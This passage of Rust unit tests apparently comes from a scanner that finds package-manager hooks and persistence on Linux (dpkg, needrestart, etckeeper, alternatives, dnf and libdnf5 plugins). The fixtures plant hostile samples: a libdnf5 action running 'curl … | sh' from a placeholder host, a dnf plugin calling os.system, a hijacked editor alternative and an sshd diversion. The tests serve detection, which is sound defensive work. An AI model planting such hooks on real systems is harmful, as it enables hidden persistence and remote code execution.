    fn dpkg_needrestart_and_etckeeper_hooks_are_read_their_way() {
        use std::os::unix::fs::PermissionsExt;
        let d = tree("pkgextras");
        let exe = |d: &Path, rel: &str, mode: u32| {
            put(d, rel, b"#!/bin/sh\n");
            std::fs::set_permissions(d.join(rel), std::fs::Permissions::from_mode(mode)).unwrap();
        };
        put(&d, "usr/bin/dpkg", b"");
        put(&d, "etc/dpkg/dpkg.cfg.d/local", b"# a comment\npost-invoke=\"/opt/after --all\"\nforce-confold\n");
        put(&d, "etc/dpkg/dpkg.cfg.d/ignored.cfg", b"pre-invoke /never\n");
        put(&d, "etc/dpkg/dpkg.cfg", b"pre-invoke /usr/local/sbin/snap-before\n");
        put(&d, "usr/sbin/needrestart", b"");
        exe(&d, "etc/needrestart/notify.d/200-mail", 0o755);
        exe(&d, "etc/needrestart/notify.d/200-mail.dpkg-old", 0o755);
        put(&d, "usr/bin/etckeeper", b"");
        exe(&d, "etc/etckeeper/pre-install.d/50-hook", 0o755);
        exe(&d, "etc/etckeeper/pre-install.d/60_under", 0o755);
        let s = scan(&d);
        let cmd = |c: &str| s.entries.iter().find(|e| e.command.as_deref() == Some(c.as_bytes()));
        assert_eq!(cmd("/opt/after --all").unwrap().raw["hook"], "post-invoke", "quotes are stripped");
        assert!(cmd("/usr/local/sbin/snap-before").is_some());
        assert!(cmd("/never").is_none(), "dpkg reads no dotted name in dpkg.cfg.d");
        let state = |name: &str| s.entries.iter().find(|e| e.name == name).map(|e| e.enabled).unwrap_or_else(|| panic!("no {name}"));
        assert_eq!(state("needrestart:notify.d/200-mail"), Enablement::Enabled);
        assert_eq!(state("needrestart:notify.d/200-mail.dpkg-old"), Enablement::Disabled);
        assert_eq!(state("etckeeper:pre-install.d/50-hook"), Enablement::Enabled);
        assert_eq!(state("etckeeper:pre-install.d/60_under"), Enablement::Disabled, "etckeeper runs no underscore");
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn a_hijacked_alternative_and_a_local_diversion_are_found() {
        let d = tree("alternatives");
        put(
            &d,
            "var/lib/dpkg/alternatives/editor",
            b"auto\n/usr/bin/editor\neditor.1.gz\n/usr/share/man/man1/editor.1.gz\n\n/usr/bin/vim.basic\n30\n/usr/share/man/man1/vim.1.gz\n/bin/nano\n40\n\n\n",
        );
        std::fs::create_dir_all(d.join("etc/alternatives")).unwrap();
        std::os::unix::fs::symlink("/tmp/evil", d.join("etc/alternatives/editor")).unwrap();
        std::os::unix::fs::symlink("/usr/share/man/man1/vim.1.gz", d.join("etc/alternatives/editor.1.gz")).unwrap();
        put(&d, "var/lib/dpkg/diversions", b"/usr/sbin/sshd\n/usr/sbin/sshd.real\n:\n/lib/x/libfoo.so\n/lib/x/libfoo.so.usr-is-merged\nlibfoo1\n");
        let s = scan(&d);
        let alts: Vec<&Entry> = s.entries.iter().filter(|e| e.kind == Kind::Alternative).collect();
        assert_eq!(alts.len(), 1, "the slave points where it was registered to");
        assert_eq!((alts[0].name.as_str(), alts[0].target_path.as_deref()), ("editor", Some(Path::new("/tmp/evil"))));
        assert!(alts[0].raw["registered"].contains("/bin/nano"));
        let div: Vec<&Entry> = s.entries.iter().filter(|e| e.kind == Kind::DpkgDiversion).collect();
        assert_eq!(div.len(), 1, "a package's own diversion is not reported");
        assert_eq!(div[0].raw["diverted_to"], "/usr/sbin/sshd.real");
        std::fs::remove_dir_all(&d).unwrap();
    }
    #[test]
    fn a_dnf_plugin_module_with_no_conf_is_still_imported_and_so_reported() {
        let dir = tree("dnf-noconf");
        put(&dir, "usr/bin/dnf-3", b"");
        put(&dir, "usr/lib/python3.12/site-packages/dnf/plugin.py", b"");
        put(&dir, "usr/lib/python3.12/site-packages/dnf-plugins/copr.py", b"import dnf\n");
        put(&dir, "etc/dnf/plugins/copr.conf", b"[main]\nenabled=1\n");
        put(&dir, "usr/lib/python3.12/site-packages/dnf-plugins/evil.py", b"import os\nos.system('/tmp/x')\n");
        let s = scan(&dir);
        let evil = one(&s, |e| e.name == "dnf-plugin:evil");
        assert_eq!(evil.enabled, Enablement::Enabled);
        assert_eq!(evil.target_path, Some(dir.join("usr/lib/python3.12/site-packages/dnf-plugins/evil.py")));
        assert_eq!(s.entries.iter().filter(|e| e.raw.get("plugin").is_some_and(|p| p == "copr")).count(), 1, "a plugin with a conf is not reported twice");
        fs::remove_dir_all(&dir).unwrap();

        // dnf5 loads no python: nothing here is imported.
        let dir = tree("dnf5-noconf");
        put(&dir, "usr/bin/dnf", b"");
        put(&dir, "usr/lib/python3.12/site-packages/dnf-plugins/evil.py", b"");
        assert!(scan(&dir).entries.iter().all(|e| e.name != "dnf-plugin:evil"));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn libdnf5_plugins_and_actions_are_package_hooks() {
        let d = std::env::temp_dir().join(format!("unbidden-libdnf5-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        let put = |rel: &str, body: &[u8]| {
            let p = d.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, body).unwrap();
        };
        put("etc/dnf/dnf.conf", b"[main]\n");
        put("etc/dnf/libdnf5-plugins/actions.conf", b"[main]\nname = actions\nenabled = 1\n");
        put("usr/lib64/libdnf5/plugins/actions.so", b"\x7fELF");
        put("etc/dnf/libdnf5-plugins/actions.d/10-evil.actions", b"# c\npost_transaction:*:in::/opt/notify ${pkg.name}\nrepos_configured::::/usr/bin/curl -s http://x.invalid | sh\nbroken line\n");
        put("etc/dnf/libdnf5-plugins/actions.d/notes.txt", b"post_transaction::::/never\n");
        let root = crate::root::Root::at(&d).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(PkgHooks)];
        let s = crate::scan::run(&root, &crate::scan::Options { deep: false }, &collectors);
        let mut got: Vec<(&str, &str, Enablement)> = s.entries.iter().map(|e| (e.name.as_str(), e.command.as_deref().map(|c| std::str::from_utf8(c).unwrap()).unwrap_or("-"), e.enabled)).collect();
        got.sort();
        assert_eq!(
            got,
            [
                ("libdnf5-actions:10-evil.actions:post_transaction:2", "/opt/notify ${pkg.name}", Enablement::Enabled),
                ("libdnf5-actions:10-evil.actions:repos_configured:3", "/usr/bin/curl -s http://x.invalid | sh", Enablement::Enabled),
                ("libdnf5-plugin:actions", "-", Enablement::Enabled),
            ],
            "only .actions files, only five-field lines"
        );
        let plugin = s.entries.iter().find(|e| e.name == "libdnf5-plugin:actions").unwrap();
        assert_eq!(plugin.target_path.as_deref(), Some(d.join("usr/lib64/libdnf5/plugins/actions.so").as_path()));
        std::fs::remove_dir_all(&d).unwrap();
    }
}
